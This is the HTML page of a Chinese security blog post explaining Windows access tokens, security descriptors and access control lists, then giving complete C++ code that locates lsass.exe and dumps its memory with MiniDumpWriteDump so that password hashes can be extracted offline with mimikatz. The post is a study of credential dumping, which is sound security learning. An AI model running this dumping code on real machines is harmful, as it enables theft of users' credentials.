@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x1 前置理论访问令牌(Access Token)​    Access Token是描述进程或线程的安全上下文的对象。其中包括进程或线程关联的用户账户的身份和权限。 ​    Access Token分为授权令牌(Delegation Token)、模拟令牌(Impersonation token)两种。 Access Token包含以下信息  用户帐户的安全标识符(SID) 用户所属组的 S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从转储lsass学习Windows安全">
+<meta property="og:url" content="http://antipassion.github.io/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="0x1 前置理论访问令牌(Access Token)​    Access Token是描述进程或线程的安全上下文的对象。其中包括进程或线程关联的用户账户的身份和权限。 ​    Access Token分为授权令牌(Delegation Token)、模拟令牌(Impersonation token)两种。 Access Token包含以下信息  用户帐户的安全标识符(SID) 用户所属组的 S">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119200455694.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119204452825.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215425139.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215253912.png">
+<meta property="article:published_time" content="2022-11-19T07:42:25.000Z">
+<meta property="article:modified_time" content="2022-11-20T02:47:24.337Z">
+<meta property="article:author" content="Nayon">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119200455694.png">
+
+<link rel="canonical" href="http://antipassion.github.io/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>从转储lsass学习Windows安全 | 林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Nayon.png">
+      <meta itemprop="name" content="Nayon">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从转储lsass学习Windows安全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-19 15:42:25" itemprop="dateCreated datePublished" datetime="2022-11-19T15:42:25+08:00">2022-11-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-20 10:47:24" itemprop="dateModified" datetime="2022-11-20T10:47:24+08:00">2022-11-20</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="0x1-前置理论"><a href="#0x1-前置理论" class="headerlink" title="0x1 前置理论"></a>0x1 前置理论</h4><h5 id="访问令牌-Access-Token"><a href="#访问令牌-Access-Token" class="headerlink" title="访问令牌(Access Token)"></a>访问令牌(Access Token)</h5><p>​    <code>Access Token</code>是描述进程或线程的安全上下文的对象。其中包括进程或线程关联的用户账户的身份和权限。</p>
+<p>​    <code>Access Token</code>分为授权令牌(Delegation Token)、模拟令牌(Impersonation token)两种。</p>
+<p>Access Token包含以下信息</p>
+<ul>
+<li>用户帐户的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-identifiers">安全标识符</a>(SID)</li>
+<li>用户所属组的 SID</li>
+<li>标识当前<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></li>
+<li>用户或用户组拥有的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges">权限</a>列表</li>
+<li>所有者 SID</li>
+<li>主要组的 SID</li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>用户在未指定安全描述符</em></a>的情况下创建安全对象时系统使用的默认<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">DACL</a></li>
+<li>访问令牌的来源</li>
+<li>令牌是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>主要</em></a>令牌还是<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation">模拟</a>令牌</li>
+<li>可选的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">限制 SID列表</a></li>
+<li>当前模拟级别</li>
+<li>其他统计</li>
+</ul>
+<p>​    <strong>Delegation Token：</strong> 用以交互式会话登陆（本地用户登陆、远程桌面等）</p>
+<p>​    <strong>Impersonation Token：</strong> 用以非交互式登陆(net user、远程共享访问)</p>
+<p>​    不同的用户登陆计算机后，都会生成一个Access Token,该token会在用户创建进程/线程时都会复制一份<code>Access token</code>用于描述与该进程相关联的用户账户的安全上下文，默认情况下，当进程的线程与安全对象交互时，系统使用<code>授权令牌</code>。此外，线程可以模拟客户帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有<code>授权令牌</code>和<code>模拟令牌</code>。当用户注销后系统会将<code>授权令牌</code>转换为<code>模拟令牌</code>，并在重启系统后清除。</p>
+<h5 id="安全对象"><a href="#安全对象" class="headerlink" title="安全对象"></a>安全对象</h5><p>安全对象是可以拥有<code>安全描述符</code>的对象，所有命名的Windows对象都是安全对象。一些未命名的对象，例如<code>进程</code>和<code>线程</code>对象也可以拥有安全描述符。。对于大多数的安全对象来说，我们可以在创建对象的函数调用中指定对象的<code>安全描述符</code>。</p>
+<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119200455694.png" alt="image-20221119200455694"></p>
+<h5 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h5><p>包含与安全对象关联的安全信息。安全描述符由<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/api/Winnt/ns-winnt-security_descriptor"><strong>SECURITY_DESCRIPTOR</strong></a>结构及其关联的安全信息组成。安全描述符可以包括以下安全信息：</p>
+<ul>
+<li>对象所有者和主要组的安全标识符（SID)。</li>
+<li>指定允许或拒绝特定用户或组的访问权限的DACL</li>
+<li>指定为对象生成审计记录的访问尝试类型的SACL。</li>
+<li>一组控制位，用以限定安全描述符或其各个成员的含义。</li>
+</ul>
+<h5 id="访问控制列表-Access-control-lists"><a href="#访问控制列表-Access-control-lists" class="headerlink" title="访问控制列表(Access control lists)"></a>访问控制列表(Access control lists)</h5><p>​    访问控制列表(ACL)是访问控制条目(ACE)的列表。ACL中每个ACE都标示一个受托者，并为该受托者指定访问权限。安全对象的安全描述符可以包含两种类型的ACL:<code>DACL</code>以及<code>SACL</code>。</p>
+<ul>
+<li>自由访问控制列表(DACL) 标示允许或者拒绝访问安全对象的受托人。当<code>进程</code>试图访问安全对象时，系统会检查对象的 DACL 中的 ACE，以确定是否授予对它的访问权限。如果对象没有 DACL，系统会授予每个人<code>Full Access</code>权限。如果对象的 DACL 没有 ACE，系统将拒绝所有访问该对象的尝试，因为 DACL 中没有可以通过匹配的ACE条目。系统按顺序检查 ACE，直到它找到一个或多个允许所有请求的访问权限的 ACE，或者直到任何一个请求的访问权限被拒绝。</li>
+<li>系统访问控制列表(SACL) 使管理员能够记录访问受保护对象的尝试。每个 ACE 指定特定受托者进行的访问尝试的类型，这些访问尝试会导致系统在安全事件日志中生成记录。SACL 中的 ACE 可以在访问尝试失败和/或成功时生成审计记录。</li>
+</ul>
+<h5 id="受托人"><a href="#受托人" class="headerlink" title="受托人"></a>受托人</h5><p>​    受托人是应用访问控制条目(ACE)的用户账户、组账户或者登陆会话。访问控制列表(ACL)中的每个ACE都有一个标示受托人的安全描述符（SID）。</p>
+<p>​    根据前置知识，我们可以得到用户登陆系统后创建进程、线程，程序访问安全对象时的权限会是怎么样的了。</p>
+<p>​    当用户登陆计算机，凭证验证通过后便会拿到一份访问令牌(Access Token)，该Token在我们创建进程或线程时会被使用，拷贝explorer.exe中的该用户的访问令牌到新的进程/线程当中用以权限分配。</p>
+<p>​    当程序访问安全对象时，安全对象会检测自身的<code>DACL</code>，若DACL不存在，则对所有程序开放访问权限；若DACL存在，会按顺序查找DACL内的ACL与程序的访问令牌比较判断，判断其是否具有访问权限。</p>
+<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119204452825.png" alt="image-20221119204452825"></p>
+<h5 id="MiniDumpWriteDump函数"><a href="#MiniDumpWriteDump函数" class="headerlink" title="MiniDumpWriteDump函数"></a>MiniDumpWriteDump函数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD                             ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] MINIDUMP_TYPE                     DumpType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/en-us/windows/win<span class="number">32</span>/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</span><br></pre></td></tr></table></figure>
+
+<p>函数结构如上所示，可利用此函数将进程转储，本文将Lsass.exe转储用以提取Hash。</p>
+<h4 id="0x2实现代码"><a href="#0x2实现代码" class="headerlink" title="0x2实现代码"></a>0x2实现代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;DbgHelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE LsassHandle = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE OutFile = <span class="built_in">CreateFile</span>(<span class="string">L&quot;LSASS.DMP&quot;</span>,GENERIC_WRITE|GENERIC_READ,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	DWORD PID;</span><br><span class="line">	HANDLE Snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 Entry;</span><br><span class="line">	Entry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">	LPWSTR ProcessName;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找lsass进程pid</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Process32First</span>(Snapshot, &amp;Entry)) &#123;</span><br><span class="line">		ProcessName = Entry.szExeFile;</span><br><span class="line">		PID = Entry.th32ProcessID;</span><br><span class="line">		<span class="keyword">while</span> (_wcsicmp(<span class="string">L&quot;lsass.exe&quot;</span>,ProcessName)!=<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">Process32Next</span>(Snapshot, &amp;Entry);</span><br><span class="line">			ProcessName = Entry.szExeFile;</span><br><span class="line">			PID = Entry.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lsass,exe pid is :&quot;</span> &lt;&lt; PID &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;snapshot error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//拿到lsass进程句柄</span></span><br><span class="line">	LsassHandle = <span class="built_in">OpenProcess</span>(</span><br><span class="line">		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,</span><br><span class="line">		<span class="literal">false</span>,</span><br><span class="line">		PID</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用MiniDumpWriteDump 转储lsass</span></span><br><span class="line">	BOOL status = <span class="built_in">MiniDumpWriteDump</span>(LsassHandle, PID, OutFile,MiniDumpWithFullMemory,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (status)</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;process dumping succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果展示，另外，若在解密文件时出现<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Key import</code>，可尝试低版本mimikatz离线解密。 如2.1.1版本。</p>
+<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215425139.png" alt="image-20221119215425139"></p>
+<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215253912.png" alt="image-20221119215253912"></p>
+<h4 id="0x3参考文章"><a href="#0x3参考文章" class="headerlink" title="0x3参考文章"></a>0x3参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/" rel="prev" title="通过WebDav进行NTLM Relay">
+      <i class="fa fa-chevron-left"></i> 通过WebDav进行NTLM Relay
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-%E5%89%8D%E7%BD%AE%E7%90%86%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">0x1 前置理论</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C-Access-Token"><span class="nav-number">1.1.</span> <span class="nav-text">访问令牌(Access Token)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.</span> <span class="nav-text">安全对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="nav-number">1.3.</span> <span class="nav-text">安全描述符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8-Access-control-lists"><span class="nav-number">1.4.</span> <span class="nav-text">访问控制列表(Access control lists)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%97%E6%89%98%E4%BA%BA"><span class="nav-number">1.5.</span> <span class="nav-text">受托人</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MiniDumpWriteDump%E5%87%BD%E6%95%B0"><span class="nav-number">1.6.</span> <span class="nav-text">MiniDumpWriteDump函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">0x2实现代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">3.</span> <span class="nav-text">0x3参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Nayon"
+      src="/images/Nayon.png">
+  <p class="site-author-name" itemprop="name">Nayon</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0range-x.github.io/" title="https:&#x2F;&#x2F;0range-x.github.io&#x2F;" rel="noopener" target="_blank">0r@nge</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://txluck.github.io/" title="https:&#x2F;&#x2F;txluck.github.io&#x2F;" rel="noopener" target="_blank">永安寺</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://odyline.github.io/" title="https:&#x2F;&#x2F;odyline.github.io&#x2F;" rel="noopener" target="_blank">Odyline</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon</span>
+</div>
